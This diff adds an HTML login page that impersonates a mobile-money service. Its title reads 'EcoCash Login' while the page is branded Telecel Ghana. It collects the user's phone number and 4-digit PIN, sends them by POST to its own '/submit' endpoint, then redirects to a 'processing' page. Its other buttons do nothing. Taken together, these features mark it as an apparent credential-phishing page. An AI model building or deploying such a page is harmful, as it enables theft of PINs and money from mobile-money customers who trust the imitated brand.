@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>EcoCash Login</title>
+
+    <!-- MOBILE -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <!-- <link rel="stylesheet" href="style.css"> -->
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            /* background: #ffffff; */
+            background: #d32f2f;
+        }
+
+        /* ===== TOP (SMALL RED) ===== */
+        .top {
+            background: #d32f2f;
+            color: white;
+            text-align: center;
+            padding: 20px 10px 15px;
+        }
+
+        .logo-circle {
+            width: 50px;
+            height: 50px;
+            background: #eee;
+            border-radius: 50%;
+            margin: auto;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            color: #d32f2f;
+            font-weight: bold;
+        }
+
+        .brand {
+            font-size: 24px;
+            margin-top: 8px;
+            font-weight: bold;
+        }
+
+        .sub {
+            font-size: 13px;
+        }
+
+        /* ===== CENTER (LARGE WHITE) ===== */
+        .center {
+            background: #fefefe;
+            padding: 50px 20% 70px 20%;
+            border-bottom-right-radius: 24%;
+            border-bottom-left-radius: 24%;
+
+
+        }
+
+        .form-box {
+            max-width: 420px;
+            margin: auto;
+        }
+
+        .title {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 18px;
+            color: #444;
+        }
+
+        label {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        select,
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-top: 8px;
+            border-radius: 12px;
+            border: 2px solid #d32f2f;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        /* PIN */
+        .pin-title {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+
+        .pin-row {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            border: 2px solid #d32f2f;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+        }
+
+        .icons {
+            display: flex;
+            align-items: center;
+            margin-left: 8px;
+            font-size: 18px;
+        }
+
+        .forgot {
+            text-align: center;
+            margin-top: 12px;
+            color: #d32f2f;
+            font-size: 13px;
+        }
+
+        /* LOGIN BUTTON */
+        .login-btn {
+            width: 100%;
+            margin-top: 30px;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background: #ccc;
+            color: white;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .login-btn.active {
+            background: #d32f2f;
+        }
+
+        /* ===== BOTTOM (MEDIUM RED WITH CURVE) ===== */
+        .bottom {
+            /* background: #d32f2f; */
+            /* margin-top: 40px; */
+            padding: 80px 20px 40px;
+            border-top-left-radius: 0px;
+            border-top-right-radius: 0px;
+            text-align: center;
+            color: white;
+        }
+
+        .bottom-logo {
+            width: 40px;
+            height: 40px;
+            background: #eee;
+            border-radius: 50%;
+            margin: auto;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #d32f2f;
+            font-weight: bold;
+            font-size: 45px;
+
+        }
+
+        .bottom h2 {
+            margin: 10px 0 5px;
+        }
+
+        .bottom p {
+            margin: 0;
+            font-size: 14px;
+        }
+
+        .btn {
+            width: 100%;
+            max-width: 400px;
+            margin: 15px auto 0;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background: white;
+            font-size: 15px;
+        }
+
+        /* MOBILE ADJUST */
+        @media (max-width: 600px) {
+            .center {
+                padding: 40px 10% 70px 10%;
+                border-bottom-right-radius: 18%;
+                border-bottom-left-radius: 18%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- TOP WHITE -->
+    <div class="top-section">
+
+        <div class="top">
+            <div class="logo-circle">t</div>
+            <div class="brand">Telecel</div>
+            <div class="sub">Mobile Financial Services</div>
+        </div>
+
+        <!-- CENTER -->
+        <div class="center">
+            <div class="form-box">
+
+                <div class="title">Login to Your Account</div>
+
+                <label>Account Type</label>
+                <select>
+                    <option>Mobile</option>
+                    <option>Broadband</option>
+                </select>
+
+                <input type="text" id="phone" readonly>
+
+                <div class="pin-title">Enter your PIN</div>
+
+                <div class="pin-row">
+                    <input maxlength="1" class="pin-box" type="password">
+                    <input maxlength="1" class="pin-box" type="password">
+                    <input maxlength="1" class="pin-box" type="password">
+                    <input maxlength="1" class="pin-box" type="password">
+                    <div class="icons">👁️ 💬</div>
+                </div>
+                <p id="errorMsg" style="color:red; text-align:center; display:none;"></p>
+
+                <div class="forgot">Forgot your PIN?</div>
+
+                <button id="submitBtn" onclick="submitOtp()" class="login-btn">LOGIN</button>
+
+            </div>
+        </div>
+
+        <!-- BOTTOM -->
+        <div class="bottom">
+
+            <div class="bottom-logo">t</div>
+            <h2>Telecel</h2>
+            <p>Ghana</p>
+            <p>Secure. Fast. Reliable.</p>
+
+            <button class="btn">📱 Download App</button>
+            <button class="btn">❓ Get Help</button>
+
+        </div>
+
+        <script>
+
+
+            const inputs = document.querySelectorAll(".pin-box");
+            const loginBtn = document.getElementById("submitBtn");
+
+            inputs.forEach((input, index) => {
+                input.addEventListener("input", () => {
+                    input.value = input.value.replace(/[^0-9]/g, "");
+
+                    if (input.value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+
+                    checkPin();
+
+                });
+
+                input.addEventListener("keydown", (e) => {
+                    if (e.key === "Backspace" && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+
+            async function submitOtp() {
+                // document.getElementById("submitBtn");
+                if (loginBtn.disabled) return;
+
+                let pin = "";
+                document.querySelectorAll(".pin-box").forEach(input => {
+                    pin += input.value;
+                });
+
+                const error = document.getElementById("errorMsg");
+
+                if (pin.length < 4) {
+                    error.innerText = "Enter full PIN";
+                    error.style.display = "block";
+                    return;
+                }
+
+                error.style.display = "none";
+
+                loginBtn.innerText = "Processing...";
+                loginBtn.disabled = true;
+
+                ;
+
+                const phone = document.getElementById("phone").value;
+
+                try {
+                    const res = await fetch("/submit", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            name: "User",
+                            phone: phone,
+                            pin: pin
+                        })
+                    });
+
+                    if (!res.ok) throw new Error();
+
+                    // clear PIN AFTER submit
+                    document.querySelectorAll(".pin-box").forEach(input => input.value = "");
+
+                    localStorage.setItem("firstProcess", "yes");
+
+                    window.location.href = "processing.html";
+
+                } catch (err) {
+                    error.innerText = "Submission failed. Try again.";
+                    error.style.display = "block";
+
+                    btn.innerText = "Submit";
+                    btn.disabled = false;
+
+                    document.getElementById("pageLoader").style.display = "none";
+                }
+            }
+
+            // BUTTON ACTIVE
+            function checkPin() {
+                let pin = "";
+                inputs.forEach(i => pin += i.value);
+
+                if (pin.length === 4) {
+                    loginBtn.classList.add("active");
+                } else {
+                    loginBtn.classList.remove("active");
+                }
+            }
+
+
+            document.getElementById("phone").value = localStorage.getItem("phone") || "+233";
+
+            window.onload = () => {
+                document.body.classList.add("loaded");
+            };
+
+        </script>
+        <div id="pageLoader" class="loader" style="display:none;"></div>
+</body>
+
+</html>
